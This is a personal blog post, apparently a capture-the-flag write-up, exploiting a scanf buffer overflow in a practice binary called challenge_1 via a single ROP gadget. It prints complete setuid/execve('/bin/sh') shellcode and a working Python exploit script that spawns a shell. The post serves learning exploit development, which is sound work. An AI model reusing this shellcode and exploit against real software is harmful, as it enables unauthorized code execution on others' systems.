<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Hacking a simple binary | Welcome to my personal blog. I talk reverse-engineering, exploit development and all things malware development here.</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Hacking a simple binary" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Initial setup and enumeration After downloading the challenge_1 executable and modifying the file permissions, I ran the program to see what it does." />
<meta property="og:description" content="Initial setup and enumeration After downloading the challenge_1 executable and modifying the file permissions, I ran the program to see what it does." />
<link rel="canonical" href="http://localhost:4000/blog/binary-exploitation/exploit-development/2023/11/19/BinExpCTF1.html" />
<meta property="og:url" content="http://localhost:4000/blog/binary-exploitation/exploit-development/2023/11/19/BinExpCTF1.html" />
<meta property="og:site_name" content="Hacking a simple binary" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-11-19T16:27:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hacking a simple binary" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-11-19T16:27:00+02:00","datePublished":"2023-11-19T16:27:00+02:00","description":"Initial setup and enumeration After downloading the challenge_1 executable and modifying the file permissions, I ran the program to see what it does.","headline":"Hacking a simple binary","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/binary-exploitation/exploit-development/2023/11/19/BinExpCTF1.html"},"url":"http://localhost:4000/blog/binary-exploitation/exploit-development/2023/11/19/BinExpCTF1.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/blog/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/blog/feed.xml" title="Hacking a simple binary" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/blog/">Hacking a simple binary</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/blog/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Hacking a simple binary</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2023-11-19T16:27:00+02:00" itemprop="datePublished">Nov 19, 2023
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h1 id="initial-setup-and-enumeration">Initial setup and enumeration</h1>
<p>After downloading the <strong>challenge_1</strong> executable and modifying the file permissions, I ran the program to see what it does.</p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/0.png" alt="Checking for binary defenses with file." /></p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/1.png" alt="Running the program." /></p>

<p>The program offers three options:</p>
<ul>
  <li>Creating a note.</li>
  <li>Reading all the created notes.</li>
  <li>Exiting the program.</li>
</ul>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/3.png" alt="Testing functionality in target program." /></p>

<p>I proceeded to check for low-hanging fruit; Format string bugs, Buffer Overflows (BoF), etc.</p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/5.png" alt="" /></p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/4.png" alt="" /></p>

<p>The program seemed to be susceptible to BoF. Next, I proceeded to examine what binary exploit mitigations were in place.</p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/6.png" alt="" /></p>

<p>I noted that there was no stack canary, the stack was executable, and no Position Independent Code. This may aid my exploitation attempts at a later stage. Moreover, I decided to leave ASLR enabled on my machine to challenge myself further.</p>

<h1 id="reversing">Reversing</h1>
<p>To conduct further investigation, I opened the executable in GDB and Ghidra. On inspection of GDB output, I found that the executable was not compiled with symbols.</p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/1.png" alt="" /></p>

<p>So, I started from the top, <strong>libc_start_main</strong>. Specifically, as the first parameter of the function is usually the main function, I concluded that it was the best place to start, considering that the binary didn’t seem very large.</p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/2.png" alt="" /></p>

<p>From there, it was relatively easy to determine the function which would be called whenever a note was created. Upon inspection of the function in question, the cause of the vulnerability was made clear.</p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/3.png" alt="" /></p>

<p>That is, the use of <strong>scanf()</strong>, an unsafe function. As it does no bounds-checking, the bounds of the 206-byte buffer could be written past. Using the payload from before, and a breakpoint on the address of the ret instruction, I was able to confirm that the top of the stack before returning from the function was 0x41 (A).</p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/5.png" alt="" /></p>

<p>Using the following payload, I was able to confirm that I could control the saved return address: <code class="language-plaintext highlighter-rouge">python3 -c “print('1\n')+('A'*216)+('C'*8))” &gt; ./test</code></p>

<p><img src="https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/7.png" alt="" /></p>

<p>(I previously ran the executable with <code class="language-plaintext highlighter-rouge">r &lt; test</code>, so restarting the program in GDB invoked the same piped input in the above screenshot.)
I used 216 A’s in the payload, as it would take 208 bytes to fill every byte of the buffer, and a further 8 to overwrite the saved base pointer.</p>

<h1 id="exploitation">Exploitation</h1>
<p>As the program was being run on a system with ASLR enabled, the simple stack-based buffer overflow would not work. This meant I would need to use a ROP chain. My first few attempts involved using Ropper to find gadgets in the Libc shared object library, but that did not work as a result of ASLR. The only addresses that did not seem to change with each new instance of the running program were the addresses of the gadgets found at the offsets of the code contained within the <strong>Challenge_1</strong> binary.</p>

<p><a href="https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/2.png"></a></p>

<p>I thought to use the gadget as shown in the above screenshot for a ret2libc-style exploit, but that did not work, as the address of <strong>system()</strong> would change with each instance of the application being launched.</p>

<p><a href="https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/3.png"></a></p>

<p>Then I had the thought to use a gadget that would essentially pop RSP’s value into RIP, such that if I were to place shellcode on the stack, I could execute it by redirecting RIP to it.
There were some gadgets I considered chaining together to achieve this, such as the following;</p>

<p><a href="https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/8.png"></a></p>

<p><a href="https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/7.png"></a></p>

<p><a href="https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/6.png"></a></p>

<p>However, after stepping away for a bit, I found a simple solution which only required a single gadget. I discovered this attack vector by investigating the rest of the code contained within the function.</p>

<p><a href="https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/91.png"></a></p>

<p>The contents of the buffer are copied to the address stored at the address stored in RDI (I.e, the first parameter passed to the function). This is likely some variable in the caller function, but I noted that I could use it, nonetheless. In addition, RAX is used as the base register for the copy operation. That would work well with the following gadget I found when using Ropper on the <strong>Challenge_1</strong> binary:</p>

<p><a href="https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/94.png"></a></p>

<p>I encountered some sort of error when using 0x40110c as the returned address with which I would overwrite the saved return address on the stack. For some reason, the address overwrite would not change the value of the saved address overwrite. However, by changing the last byte of the address, the overwrite would proceed as expected. I managed to solve the problem by altering the gadget address, such that the address used would be of the prior instruction, such that the last byte is anything other than 0x0c.</p>

<p><a href="https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/95.png"></a></p>

<p>As the prior instruction was benign in relation to the intention, it would work (I.e because EDI’s value is not crucial to the exploit succeeding, its value being altered would not present any unexpected behavior).
With the attack vector mapped out, I decided to write some shellcode, as it was the only piece of the exploit that was absent.
The result was the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>section .data 
section .bss
section .text

global _start

_start:
    jmp shellString
pwn:
    ; setuid(0) - GG if setuid :)
    xor rax, rax
    xor rdi, rdi
    mov al, 0x69
    syscall

    ; execve("/bin/sh", 0x0, 0x0)
    xor rax, rax
    xor rdx, rdx
    xor rsi, rsi
    xor rcx, rcx
    mov al, 0x3B
    pop rdi
    mov rdi, [rdi]
    push rdi
    push rsp
    pop rdi
    mov BYTE [rdi + 7], cl
    syscall

shellString:
    call pwn
    sh dq "/bin/sh"
</code></pre></div></div>

<p>Finally, the resultant exploit code was as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from struct import pack
from os import system

shellcode = b"\xeb\x24\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xc0\x48\x31"
shellcode += b"\xd2\x48\x31\xf6\x48\x31\xc9\xb0\x3b\x5f\x48\x8b\x3f\x57\x54\x5f\x88"
shellcode += b"\x4f\x07\x0f\x05\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

return_addr = pack( "&lt;L", 0x401107 )

target = "./challenge_1"
payload = ( b'1\n' ) + shellcode + ( b'A' * 166 ) + return_addr


def main():
    with open( "payload", "wb+" ) as f:
        f.write( payload )

    system( f"(cat payload; printf '\n' ;cat) | {target}" )

if __name__ == "__main__":
    main()
</code></pre></div></div>

<p>When run, I observed that the exploit worked as intended, and I successfully managed to get a shell!</p>

<p><a href="https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/97.png"></a></p>


  </div><a class="u-url" href="/blog/binary-exploitation/exploit-development/2023/11/19/BinExpCTF1.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/blog/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">Hacking a simple binary</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">Hacking a simple binary</li><li><a class="u-email" href="mailto:theodore.thobane@gmail.com">theodore.thobane@gmail.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/0x0L0RD"><svg class="svg-icon"><use xlink:href="/blog/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0x0L0RD</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Welcome to my personal blog. I talk reverse-engineering, exploit development and all things malware development here. </p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
